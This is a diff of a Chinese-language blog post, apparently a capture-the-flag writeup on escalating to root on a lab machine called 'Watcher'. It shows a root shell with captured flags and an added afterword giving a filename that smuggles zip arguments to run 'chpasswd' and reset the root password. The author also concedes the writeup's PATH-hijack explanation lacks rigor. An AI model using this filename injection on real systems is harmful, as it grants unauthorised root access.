@@ -184,7 +184,7 @@ watcher@Watcher:/tmp$ ./rspy --dbus --dbus-interval 1</pre></div>
 512+0 records out
 536870912 bytes (537 MB, 512 MiB) copied, 1.1236 s, 478 MB/s</pre></div>
 <p>这招运气好确实能看清命令，但后来我用到一个 111 大佬教的奇招：直接在文件名里带上横杠 <code class="notranslate">-</code>。</p>
-<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/23de102d3b946aa9910c3398d8559bc259bd7494cce7577229cb98a54989d83c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270"><img src="https://camo.githubusercontent.com/23de102d3b946aa9910c3398d8559bc259bd7494cce7577229cb98a54989d83c/687474703a2f2f377231554d50484b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270" alt="E005D6C945C3C44B20EE2E7D7E255088" data-canonical-src="http://7r1UMPHK.github.io/image/20260604180255763.webp" style="max-width: 100%;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/eeb266b358aa95405d15a157f16575d525d5648f966ee9a188a67cb02395247e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270"><img src="https://camo.githubusercontent.com/eeb266b358aa95405d15a157f16575d525d5648f966ee9a188a67cb02395247e/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303236303630343138303235353736332e77656270" alt="a" data-canonical-src="https://7r1umphk.github.io/image/20260604180255763.webp" style="max-width: 100%;"></a></p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">watcher@Watcher:<span class="pl-k">~</span>/uploads$ <span class="pl-c1">printf</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>./- a.txt<span class="pl-pds">"</span></span></pre></div>
 <p>这个文件一建出来，进程就直接卡死了。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">2026-06-02 09:43:05 DBUS: UID=0     PID=745      <span class="pl-k">|</span> /bin/bash /opt/autoarchive/archive-helper <span class="pl-s"><span class="pl-pds">"</span>- a.txt<span class="pl-pds">"</span></span>
@@ -211,7 +211,15 @@ uid=1000(watcher) gid=1000(watcher) euid=0(root) egid=0(root) groups=0(root),100
 bash-5.2# cat /root/root.txt /home/watcher/user.txt 
 flag{root-6661e4dc99e9408984d16d30b0c0730c}
 flag{user-c3949567202847f1ad8664095f0a94e4}</pre></div>
-<p>直接拿 shell，成功获取 root 权限并读到两个 flag。</p></div>
+<p>直接拿 shell，成功获取 root 权限并读到两个 flag。</p>
+<hr>
+<p>碎碎念：先叠甲，没有攻击/映射任何人或组织的想法。</p>
+<p>这个提权点其实应该走的是 zip 的命令注入，也就是通过构造特殊文件名来注入参数：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">touch -- <span class="pl-s"><span class="pl-pds">'</span>-T -TT echo${IFS}root:1|chpasswd;#.txt<span class="pl-pds">'</span></span>
+su root</pre></div>
+<p>至于为什么我明知道有这条路，文章里还是写的 PATH 劫持。因为我一开始打的时候走的就是 PATH，你可以说我狗运或者说我马后炮，但我是这么做的我就这么写了。我知道这个方法在理论上缺乏严谨的支撑，但它确实打通了，我也不想深究（没人提的话）。</p>
+<p>这也侧面说明了一个问题：这个博客里面很多 writeup 都是有问题的，就我个人来看也不是完美的，但我还是这样发了。你说我坏吧，也不绝对，主要是懒。所以如果你发现哪篇文章有问题，直接评论区喷我就行，或者你认识我的话直接私聊我也行（想给我留点脸）。不用怕我丢脸，我没脸。你不说我不改（笑）。</p>
+<p>这次就是某不愿透露姓名的大佬在文章发出来两三天后就发现了这个问题并且跟我提了，感谢。</p></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
